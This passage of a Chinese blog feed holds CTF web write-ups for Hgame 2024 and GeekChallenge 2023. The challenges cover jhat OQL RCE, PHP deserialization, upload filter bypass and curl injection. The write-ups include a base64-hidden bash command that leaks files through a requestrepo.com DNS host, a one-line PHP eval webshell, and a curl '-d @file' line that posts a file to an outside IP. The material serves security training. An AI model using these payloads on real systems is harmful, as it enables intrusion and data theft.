title="2048*16"></a><strong>2048*16</strong></h1><p>这里首先的难点是我们明知道是JS游戏题，想要去调试，修改变量直接获取胜利，但是这里首先ban掉了F12和鼠标右键，还有ctrl+U这些不让我们看源码和调试，这个是JS做到的，所以我们还是直接禁用JS就可以打开调试工具了。</p><p>新的问题来了，这里JS关闭后，游戏不会正常启动，调试工具倒是打开了，那么这里利用浏览器的性质，打开F12后刷新也会保留F12。所以我们这里再打开JS刷新页面即可。</p><p><img src="/img/Hgame_2024/6.png" alt="图片.png"></p><p>新的问题来了，这里触发了JS反调试，无限debugger，这样是无法调试的，我们需要反 反调试。</p><p><a href="https://blog.csdn.net/wxtcstt/article/details/129906561">https://blog.csdn.net/wxtcstt/article/details/129906561</a></p><p>在控制台里按以下方法输入：</p><ol><li>打开F12点击Console</li><li>输入(function(){}).constructor &#x3D;&#x3D;&#x3D; Function，回车；</li><li>如果返回的是true，继续输入Function.prototype.constructor &#x3D; function(){},并回车；</li><li>切换回sources选项卡,点击继续执行，无限debugger的问题就解决了</li></ol><p><img src="/img/Hgame_2024/7.png" alt="图片.png"></p><p>这里第一步我们就解决了，可以调试了，但是这道题把分数变量藏得很深，不能直接通过修改分数来达成目的。</p><p>我们搜索won，把断点打在1207行，这里明显是判断胜负的地方，那么，我们继续故意输掉游戏，让游戏卡在断点处。</p><p><img src="/img/Hgame_2024/8.png" alt="图片.png"></p><p>输掉游戏后，我们逐步跟进</p><p><img src="/img/Hgame_2024/9.png" alt="图片.png"></p><p>差不多五六步之后，出现了这样一个变量</p><p><img src="/img/Hgame_2024/10.png" alt="图片.png"></p><p>很明显了，我们在控制台处输入x&#x3D;true</p><p>然后放开调试，让程序正常运行，拿到flag</p><p><img src="/img/Hgame_2024/11.png" alt="图片.png"></p><p><strong>flag{b99b820f-934d-44d4-93df-41361df7df2d}</strong></p><h1 id="jhat"><a href="#jhat" class="headerlink" title="jhat"></a><strong>jhat</strong></h1><p><strong>提示1</strong>hint1: need rce</p><p><strong>提示2</strong>hint2: focus on oql</p><p><strong>提示3</strong>hint3: 题目不出网 想办法拿到执行结果</p><p>提示已经给的很全面了，打开环境后，进入OQL，即Object Query Language (OQL) query</p><p>然后要在这个框框里打payload进行rce，java题通用的rce payload为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">java.lang.Runtime.getRuntime().exec(<span class="hljs-string">&quot;payload&quot;</span>)<br></code></pre></td></tr></table></figure><p>那么题目不出网，老方法，DNSlog外带。该方法在week2里已经写过，这里不再赘述。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">java.lang.Runtime.getRuntime().exec(<span class="hljs-string">&quot;bash -c &#123;echo,Y3VybCBgY2F0IC9mKmAuM2p1c2V2NTUucmVxdWVzdHJlcG8uY29t&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="/img/Hgame_2024/12.png" alt="图片.png"></p><p><strong>hgame{c000110cc71ea5a1e5b4366597038d8855af5a0f}</strong></p>]]></content>
    
    
    <categories>
      
      <category>WPs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WPs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GeekChallenge 2023 WEB赛题目WP</title>
    <link href="/2023/11/28/GeekChallenge%202023%20WEB%E8%B5%9B%E9%A2%98WP/"/>
    <url>/2023/11/28/GeekChallenge%202023%20WEB%E8%B5%9B%E9%A2%98WP/</url>
    
    <content type="html"><![CDATA[<p>by:Infernity</p><h2 id="EzHttp"><a href="#EzHttp" class="headerlink" title="EzHttp"></a>EzHttp</h2><p>请post传参username和password进行登录</p><p>第一步先找username和password，查看源码发现“**密码记在了不想让爬虫获取的地方!**”</p><p>查阅资料，</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">几乎所有的搜索引擎爬虫，都会遵守robots协议<br></code></pre></td></tr></table></figure><p>那么打开robots.txt，再进入&#x2F;o2takuXX’s_username_and_password.txt</p><p>发现username和password</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">username:</span>admin<br><span class="hljs-symbol">password:</span>@dm1N123456r00t<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p>返回index.php，继续传参后：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">必须来源自sycsec.<span class="hljs-keyword">com</span><br></code></pre></td></tr></table></figure><p>那么修改Referer为sycsec.com</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">请使用Syclover浏览器<br></code></pre></td></tr></table></figure><p>那么修改User-Agent为Syclover</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">请从localhost访问<br></code></pre></td></tr></table></figure><p>那么添加一句x-forwarded-for:127.0.0.1</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">请使用Syc.vip代理<br></code></pre></td></tr></table></figure><p>那么添加一句via:Syc.vip</p><p>然后代码审计php，$_SERVER是获取请求头里的参数值，后面是HTTP_O2TAKUXX，我们去掉HTTP_在请求头里加一句：O2TAKUXX：GiveMeFlag</p><p>爆出flag：SYC{HttP_1s_E@sY}</p><h2 id="unsign"><a href="#unsign" class="headerlink" title="unsign"></a>unsign</h2><p>反序列化，好诶！</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">web</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eva1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$interesting</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;get!&lt;br&gt;&quot;</span>);<br>        <span class="hljs-variable">$eva1</span>=<span class="hljs-variable language_">$this</span>-&gt;eva1;<br>        <span class="hljs-variable">$eva1</span>(<span class="hljs-variable language_">$this</span>-&gt;interesting);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>先看末尾，web这个类里有明显的提示eva1长得像eval勒，肯定就是这里命令执行输出flag，我们写eva1&#x3D;’system’，interesting&#x3D;’ls &#x2F;‘</p><p>那么我们肯定要先进入这个方法：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">__get</span>()    <span class="hljs-comment">//用于从不可访问的属性读取数据</span><br></code></pre></td></tr></table></figure><p>那肯定就要往上看了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">lover</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$yxx</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$QW</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;invoke!&lt;br&gt;&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;yxx-&gt;QW;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>lover这个类里面最后return $this-&gt;yxx-&gt;QW;我们只需要将yyx和QW随便设置一个值，反正随便设置的肯定没法访问，所以就能触发get()方法，我这里设置yxx&#x3D;’a’，QW&#x3D;’a’</p><p>要这样用，肯定就要触发invoke()方法，</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">__invoke</span>()   <span class="hljs-comment">//当脚本尝试将对象调用为函数时触发</span><br></code></pre></td></tr></table></figure><p>就要看最上面的一个类：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">syc</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cuit</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;action!&lt;br&gt;&quot;</span>);<br>        <span class="hljs-variable">$function</span>=<span class="hljs-variable language_">$this</span>-&gt;cuit;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里$function&#x3D;$this-&gt;cuit;把cuit的值赋给function，然后return $function();这里就触发invoke()方法，</p><p>这里也不用管cuit到底是什么，反正都会将对象调用为函数而出发invoke()我这里设置cuit&#x3D;’a’</p><p>而destruct()方法是在这里会自动触发，所以不用管。</p><p>最终代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">syc</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cuit</span>=<span class="hljs-string">&#x27;a&#x27;</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">lover</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$yxx</span>=<span class="hljs-string">&#x27;a&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$QW</span>=<span class="hljs-string">&#x27;a&#x27;</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">web</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eva1</span>=<span class="hljs-string">&#x27;system&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$interesting</span>=<span class="hljs-string">&#x27;ls /&#x27;</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">syc</span>();<br><span class="hljs-variable">$a</span>-&gt;cuit=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">lover</span>();<br><span class="hljs-variable">$a</span>-&gt;cuit-&gt;yxx=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">web</span>();<br><span class="hljs-keyword">echo</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>把输出传入题中，发现返回了ls &#x2F;的执行情况，那么这道题就解决了。</p><p>SYC{wqle9ssXk9cB7fhYly}</p><h4 id="n00b-Upload"><a href="#n00b-Upload" class="headerlink" title="n00b_Upload"></a>n00b_Upload</h4><p>文件上传，先传一个jpg文件看看</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;123&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>说我后缀过了，头部过了，你上传的内容一看就是木马</p><p>说明有文件内容检查，经过尝试，发现会过滤&lt;?php，那么使用php短标签试试</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span>(表达式)<span class="hljs-meta">?&gt;</span>          等价于 <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> (表达式)<span class="hljs-meta">?&gt;</span>  <span class="hljs-comment">#不需要开启参数设置</span><br></code></pre></td></tr></table></figure><p>传入123.php</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">&lt;<span class="hljs-string">?=</span>(<span class="hljs-string">`ls`</span>)<span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><p>发现上传成功，进入文件目录，发现回显了本目录下的所有东西，那么这道题解决了。</p><p>（这道题还是动态flag&#x3D;-&#x3D;）</p><p>SYC{hUR1ep7TkikaVYaoiM}</p><h2 id="easy-php"><a href="#easy-php" class="headerlink" title="easy_php"></a>easy_php</h2><p>php代码审计</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">preg_match</span><span class="hljs-params">(<span class="hljs-string">&#x27;/^Welcome to GEEK 2023!$/i&#x27;</span>, $_GET[<span class="hljs-string">&#x27;syc&#x27;</span>])</span></span><br></code></pre></td></tr></table></figure><p>这一句^和$的作用是从头到尾匹配，说明我们不能在前后增减字符，只能是他给的这个字符串，但是</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">$_GET[&#x27;syc&#x27;] !== &#x27;Welcome to GEEK <span class="hljs-number">2023</span>!&#x27;<br></code></pre></td></tr></table></figure><p>后面又让我们传入的syc不等于他给的字符串怎么办勒，关键就是第一句prge_match的修饰符&#x2F;i</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/ regexp /</span> i                      不区分大小写的匹配 <br></code></pre></td></tr></table></figure><p>那么，我们只需要在原字符串上随便修改一个大小写就成功进入if，传入syc&#x3D;Welcome to GEEk 2023!</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">intval</span><span class="hljs-params">($_GET[<span class="hljs-string">&#x27;lover&#x27;</span>])</span></span> &lt; <span class="hljs-number">2023</span> &amp;&amp; <span class="hljs-built_in">intval</span>($_GET<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;lover&#x27;</span>]</span> + <span class="hljs-number">1</span>) &gt; <span class="hljs-number">2024</span><br></code></pre></td></tr></table></figure><p>这一句intval函数是取得变量的整数部分，如果是字符串就为0,如果是数字和字符串，取得第一个遇到的数字的值。这里让lover&lt;2023 加1后又大于2024，怎么办嘞，我们利用intval函数和php传参时的性质：</p><p>我们知道php传入的参数都是字符串，而且php中数字有特殊的表示方式，比如科学技术法。</p><p>我们传入lover&#x3D;2e4，传入2e4后因为会被识别成字符串，intval函数就会取第一个数字的值，即为2,这里就小于了2023，后面’2e4’+1这里进行了运算，php就会认为2e4不是字符串而是个数字，即是20000+1&#x3D;20001&gt;2024</p><p>这里就进入了if。</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$array1 = (<span class="hljs-built_in">string</span>)$_POST[<span class="hljs-string">&#x27;qw&#x27;</span>]<span class="hljs-comment">;</span><br>$array2 = (<span class="hljs-built_in">string</span>)$_POST[<span class="hljs-string">&#x27;yxx&#x27;</span>]<span class="hljs-comment">;</span><br><span class="hljs-keyword">if</span> (sha1($array1) === sha1($array2))<br></code></pre></td></tr></table></figure><p>这里强制把我们传入的qw和yxx转成了字符串，那么平时强比较绕过的方法就失效了，我们必须找sha1确实相等的两个字符串。经过查找sha1碰撞：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm">qw<span class="hljs-operator">=</span><span class="hljs-variable">%25</span>PDF<span class="hljs-number">-1.3</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%25</span><span class="hljs-variable">%E2</span><span class="hljs-variable">%E3</span><span class="hljs-variable">%CF</span><span class="hljs-variable">%D3</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>A<span class="hljs-number">1</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>obj<span class="hljs-variable">%0</span>A<span class="hljs-variable">%3</span>C<span class="hljs-variable">%3</span>C/Width<span class="hljs-variable">%202</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Height<span class="hljs-variable">%203</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Type<span class="hljs-variable">%204</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Subtype<span class="hljs-variable">%205</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Filter<span class="hljs-variable">%206</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/ColorSpace<span class="hljs-variable">%207</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Length<span class="hljs-variable">%208</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/BitsPerComponent<span class="hljs-variable">%208</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>Astream<span class="hljs-variable">%0</span>A<span class="hljs-variable">%FF</span><span class="hljs-variable">%D8</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%00</span><span class="hljs-variable">%24</span>SHA<span class="hljs-number">-1</span><span class="hljs-variable">%20</span>is<span class="hljs-variable">%20</span>dead<span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%85</span>/<span class="hljs-variable">%EC</span><span class="hljs-variable">%09</span><span class="hljs-variable">%239</span>u<span class="hljs-variable">%9</span>C<span class="hljs-number">9</span><span class="hljs-variable">%B1</span><span class="hljs-variable">%A1</span><span class="hljs-variable">%C6</span><span class="hljs-variable">%3</span>CL<span class="hljs-variable">%97</span><span class="hljs-variable">%E1</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%01</span><span class="hljs-variable">%7</span>FF<span class="hljs-variable">%DC</span><span class="hljs-variable">%93</span><span class="hljs-variable">%A6</span><span class="hljs-variable">%B6</span><span class="hljs-variable">%7</span>E<span class="hljs-variable">%01</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%02</span><span class="hljs-variable">%9</span>A<span class="hljs-variable">%AA</span><span class="hljs-variable">%1</span>D<span class="hljs-variable">%B2V</span><span class="hljs-variable">%0</span>BE<span class="hljs-variable">%CAg</span><span class="hljs-variable">%D6</span><span class="hljs-variable">%88</span><span class="hljs-variable">%C7</span><span class="hljs-variable">%F8K</span><span class="hljs-variable">%8</span>CLy<span class="hljs-variable">%1</span>F<span class="hljs-variable">%E0</span><span class="hljs-variable">%2</span>B<span class="hljs-variable">%3</span>D<span class="hljs-variable">%F6</span><span class="hljs-variable">%14</span><span class="hljs-variable">%F8m</span><span class="hljs-variable">%B1i</span><span class="hljs-variable">%09</span><span class="hljs-variable">%01</span><span class="hljs-variable">%C5kE</span><span class="hljs-variable">%C1S</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%FE</span><span class="hljs-variable">%DF</span><span class="hljs-variable">%B7</span><span class="hljs-variable">%608</span><span class="hljs-variable">%E9rr</span>/<span class="hljs-variable">%E7</span><span class="hljs-variable">%ADr</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%0</span>EI<span class="hljs-variable">%04</span><span class="hljs-variable">%E0F</span><span class="hljs-variable">%C20W</span><span class="hljs-variable">%0</span>F<span class="hljs-variable">%E9</span><span class="hljs-variable">%D4</span><span class="hljs-variable">%13</span><span class="hljs-variable">%98</span><span class="hljs-variable">%AB</span><span class="hljs-variable">%E1.</span><span class="hljs-variable">%F5</span><span class="hljs-variable">%BC</span><span class="hljs-variable">%94</span><span class="hljs-variable">%2</span>B<span class="hljs-variable">%E35B</span><span class="hljs-variable">%A4</span><span class="hljs-variable">%80</span>-<span class="hljs-variable">%98</span><span class="hljs-variable">%B5</span><span class="hljs-variable">%D7</span><span class="hljs-variable">%0</span>F<span class="hljs-variable">%2</span>A<span class="hljs-number">3</span>.<span class="hljs-variable">%C3</span><span class="hljs-variable">%7</span>F<span class="hljs-variable">%AC5</span><span class="hljs-variable">%14</span><span class="hljs-variable">%E7M</span><span class="hljs-variable">%DC</span><span class="hljs-variable">%0</span>F<span class="hljs-variable">%2</span>C<span class="hljs-variable">%C1</span><span class="hljs-variable">%A8t</span><span class="hljs-variable">%CD</span><span class="hljs-variable">%0</span>Cx<span class="hljs-number">0</span>Z<span class="hljs-variable">%21</span>Vda<span class="hljs-number">0</span><span class="hljs-variable">%97</span><span class="hljs-variable">%89</span><span class="hljs-variable">%60</span>k<span class="hljs-variable">%D0</span><span class="hljs-variable">%BF</span><span class="hljs-variable">%3</span>F<span class="hljs-variable">%98</span><span class="hljs-variable">%CD</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%04</span>F<span class="hljs-variable">%29</span><span class="hljs-variable">%A1</span><br>&amp;<br>yxx<span class="hljs-operator">=</span><span class="hljs-variable">%25</span>PDF<span class="hljs-number">-1.3</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%25</span><span class="hljs-variable">%E2</span><span class="hljs-variable">%E3</span><span class="hljs-variable">%CF</span><span class="hljs-variable">%D3</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>A<span class="hljs-number">1</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>obj<span class="hljs-variable">%0</span>A<span class="hljs-variable">%3</span>C<span class="hljs-variable">%3</span>C/Width<span class="hljs-variable">%202</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Height<span class="hljs-variable">%203</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Type<span class="hljs-variable">%204</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Subtype<span class="hljs-variable">%205</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Filter<span class="hljs-variable">%206</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/ColorSpace<span class="hljs-variable">%207</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Length<span class="hljs-variable">%208</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/BitsPerComponent<span class="hljs-variable">%208</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>Astream<span class="hljs-variable">%0</span>A<span class="hljs-variable">%FF</span><span class="hljs-variable">%D8</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%00</span><span class="hljs-variable">%24</span>SHA<span class="hljs-number">-1</span><span class="hljs-variable">%20</span>is<span class="hljs-variable">%20</span>dead<span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%85</span>/<span class="hljs-variable">%EC</span><span class="hljs-variable">%09</span><span class="hljs-variable">%239</span>u<span class="hljs-variable">%9</span>C<span class="hljs-number">9</span><span class="hljs-variable">%B1</span><span class="hljs-variable">%A1</span><span class="hljs-variable">%C6</span><span class="hljs-variable">%3</span>CL<span class="hljs-variable">%97</span><span class="hljs-variable">%E1</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%01</span>sF<span class="hljs-variable">%DC</span><span class="hljs-variable">%91</span>f<span class="hljs-variable">%B6</span><span class="hljs-variable">%7</span>E<span class="hljs-variable">%11</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%02</span><span class="hljs-variable">%9</span>A<span class="hljs-variable">%B6</span><span class="hljs-variable">%21</span><span class="hljs-variable">%B2V</span><span class="hljs-variable">%0</span>F<span class="hljs-variable">%F9</span><span class="hljs-variable">%CAg</span><span class="hljs-variable">%CC</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%C7</span><span class="hljs-variable">%F8</span><span class="hljs-variable">%5</span>B<span class="hljs-variable">%A8Ly</span><span class="hljs-variable">%03</span><span class="hljs-variable">%0</span>C<span class="hljs-variable">%2</span>B<span class="hljs-variable">%3</span>D<span class="hljs-variable">%E2</span><span class="hljs-variable">%18</span><span class="hljs-variable">%F8m</span><span class="hljs-variable">%B3</span><span class="hljs-variable">%A9</span><span class="hljs-variable">%09</span><span class="hljs-variable">%01</span><span class="hljs-variable">%D5</span><span class="hljs-variable">%DFE</span><span class="hljs-variable">%C1O</span><span class="hljs-variable">%26</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%DF</span><span class="hljs-variable">%B3</span><span class="hljs-variable">%DC8</span><span class="hljs-variable">%E9j</span><span class="hljs-variable">%C2</span>/<span class="hljs-variable">%E7</span><span class="hljs-variable">%BDr</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%0</span>EE<span class="hljs-variable">%BC</span><span class="hljs-variable">%E0F</span><span class="hljs-variable">%D2</span><span class="hljs-variable">%3</span>CW<span class="hljs-variable">%0</span>F<span class="hljs-variable">%EB</span><span class="hljs-variable">%14</span><span class="hljs-variable">%13</span><span class="hljs-variable">%98</span><span class="hljs-variable">%BBU.</span><span class="hljs-variable">%F5</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%2</span>B<span class="hljs-variable">%E31</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%A4</span><span class="hljs-variable">%807</span><span class="hljs-variable">%B8</span><span class="hljs-variable">%B5</span><span class="hljs-variable">%D7</span><span class="hljs-variable">%1</span>F<span class="hljs-variable">%0</span>E<span class="hljs-number">3</span>.<span class="hljs-variable">%DF</span><span class="hljs-variable">%93</span><span class="hljs-variable">%AC5</span><span class="hljs-variable">%00</span><span class="hljs-variable">%EBM</span><span class="hljs-variable">%DC</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%EC</span><span class="hljs-variable">%C1</span><span class="hljs-variable">%A8dy</span><span class="hljs-variable">%0</span>Cx<span class="hljs-variable">%2</span>Cv<span class="hljs-variable">%21</span>V<span class="hljs-variable">%60</span><span class="hljs-variable">%DD0</span><span class="hljs-variable">%97</span><span class="hljs-variable">%91</span><span class="hljs-variable">%D0k</span><span class="hljs-variable">%D0</span><span class="hljs-variable">%AF</span><span class="hljs-variable">%3</span>F<span class="hljs-variable">%98</span><span class="hljs-variable">%CD</span><span class="hljs-variable">%A4</span><span class="hljs-variable">%BCF</span><span class="hljs-variable">%29</span><span class="hljs-variable">%B1</span><br></code></pre></td></tr></table></figure><p>POST传参，成功绕过。</p><p>最后一步是非法变量名，在php中[ . 空格 +都会被转为_而如果前面有一个[，就只有这个中括号会被转化为下划线，后面的这些字符就不会被转化，所以我们传入SYC[GEEK.2023&#x3D;Happy to see you!</p><p>成功拿到flag</p><p>SYC{RF8MgCYJC9diWlfaKq}</p><h2 id="ctf-curl"><a href="#ctf-curl" class="headerlink" title="ctf_curl"></a>ctf_curl</h2><p>这里考察curl的用法</p><p><a href="https://www.ruanyifeng.com/blog/2019/09/curl-reference.html">https://www.ruanyifeng.com/blog/2019/09/curl-reference.html</a></p><p>告诉了我们flag的位置和名字，我们使用-d参数，将flag发送到我们的服务器上，</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">addr</span>=-d @/tmp/Syclover 47.108.89.135<br></code></pre></td></tr></table></figure><p>由于这里过滤了:所以我们不能添加端口，只能使用默认的80端口。</p><p>打开ssh链接服务器，监听80端口，在输入参数发包，就能在我们的服务器上接受到flag</p><h2 